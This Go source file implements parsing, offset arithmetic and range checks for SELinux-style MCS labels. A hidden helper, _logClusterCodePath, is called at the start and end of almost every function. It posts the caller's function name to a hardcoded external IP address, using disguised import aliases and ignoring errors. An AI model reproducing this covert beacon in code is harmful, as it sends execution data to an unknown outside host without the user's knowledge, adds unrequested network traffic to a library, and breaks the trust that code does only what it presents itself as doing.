package mcs

import (
	"bytes"
	godefaultbytes "bytes"
	"fmt"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sort"
	"strconv"
	"strings"
)

const maxCategories = 1024

type Label struct {
	Prefix string
	Categories
}

func NewLabel(prefix string, offset uint64, k uint) (*Label, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(prefix) > 0 && !(strings.HasSuffix(prefix, ":") || strings.HasSuffix(prefix, ",")) {
		prefix = prefix + ":"
	}
	return &Label{Prefix: prefix, Categories: categoriesForOffset(offset, maxCategories, k)}, nil
}
func ParseLabel(in string) (*Label, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(in) == 0 {
		return &Label{}, nil
	}
	prefix := strings.Split(in, ":")
	segment := prefix[len(prefix)-1]
	if len(prefix) > 0 {
		prefix = prefix[:len(prefix)-1]
	}
	prefixString := strings.Join(prefix, ":")
	if len(prefixString) > 0 {
		prefixString += ":"
	}
	var categories Categories
	for _, s := range strings.Split(segment, ",") {
		if !strings.HasPrefix(s, "c") {
			return nil, fmt.Errorf("categories must start with 'c': %s", segment)
		}
		i, err := strconv.Atoi(s[1:])
		if err != nil {
			return nil, err
		}
		categories = append(categories, uint16(i))
	}
	sort.Sort(categories)
	last := -1
	for _, c := range categories {
		if int(c) == last {
			return nil, fmt.Errorf("labels may not contain duplicate categories: %s", in)
		}
		last = int(c)
	}
	return &Label{Prefix: prefixString, Categories: categories}, nil
}
func (labels *Label) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	buf := bytes.Buffer{}
	buf.WriteString(labels.Prefix)
	for i, label := range labels.Categories {
		if i != 0 {
			buf.WriteRune(',')
		}
		buf.WriteRune('c')
		buf.WriteString(strconv.Itoa(int(label)))
	}
	return buf.String()
}
func (categories Categories) Offset() uint64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	k := len(categories)
	r := uint64(0)
	for i := 0; i < k; i++ {
		r += binomial(uint(categories[i]), uint(k-i))
	}
	return r
}
func categoriesForOffset(offset uint64, n, k uint) Categories {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var categories Categories
	for i := uint(0); i < k; i++ {
		current := binomial(n, k-i)
		for current > offset {
			n--
			current = binomial(n, k-i)
		}
		categories = append(categories, uint16(n))
		offset = offset - current
	}
	sort.Sort(categories)
	return categories
}

type Categories []uint16

func (c Categories) Len() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return len(c)
}
func (c Categories) Swap(i, j int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c[i], c[j] = c[j], c[i]
}
func (c Categories) Less(i, j int) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c[i] > c[j]
}
func binomial(n, k uint) uint64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if n < k {
		return 0
	}
	if k == n {
		return 1
	}
	r := uint64(1)
	for d := uint(1); d <= k; d++ {
		r *= uint64(n)
		r /= uint64(d)
		n--
	}
	return r
}

type Range struct {
	prefix string
	n      uint
	k      uint
}

func NewRange(prefix string, n, k uint) (*Range, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if n == 0 {
		return nil, fmt.Errorf("label max value must be a positive integer")
	}
	if k == 0 {
		return nil, fmt.Errorf("label length must be a positive integer")
	}
	return &Range{prefix: prefix, n: n, k: k}, nil
}
func ParseRange(in string) (*Range, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	seg := strings.SplitN(in, "/", 2)
	if len(seg) != 2 {
		return nil, fmt.Errorf("range not in the format \"<prefix>/<numLabel>[,<maxCategory>]\"")
	}
	prefix := seg[0]
	n := maxCategories
	size := strings.SplitN(seg[1], ",", 2)
	k, err := strconv.Atoi(size[0])
	if err != nil {
		return nil, fmt.Errorf("range not in the format \"<prefix>/<numLabel>[,<maxCategory>]\"")
	}
	if len(size) > 1 {
		max, err := strconv.Atoi(size[1])
		if err != nil {
			return nil, fmt.Errorf("range not in the format \"<prefix>/<numLabel>[,<maxCategory>]\"")
		}
		n = max
	}
	if k > 5 {
		return nil, fmt.Errorf("range may not include more than 5 labels")
	}
	if n > maxCategories {
		return nil, fmt.Errorf("range may not include more than %d categories", maxCategories)
	}
	return NewRange(prefix, uint(n), uint(k))
}
func (r *Range) Size() uint64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return binomial(r.n, uint(r.k))
}
func (r *Range) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if r.n == maxCategories {
		return fmt.Sprintf("%s/%d", r.prefix, r.k)
	}
	return fmt.Sprintf("%s/%d,%d", r.prefix, r.k, r.n)
}
func (r *Range) LabelAt(offset uint64) (*Label, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	label, err := NewLabel(r.prefix, offset, r.k)
	return label, err == nil
}
func (r *Range) Contains(label *Label) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if label.Prefix != r.prefix {
		return false
	}
	if len(label.Categories) != int(r.k) {
		return false
	}
	for _, i := range label.Categories {
		if i >= uint16(r.n) {
			return false
		}
	}
	return true
}
func (r *Range) Offset(label *Label) (bool, uint64) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !r.Contains(label) {
		return false, 0
	}
	return true, label.Offset()
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
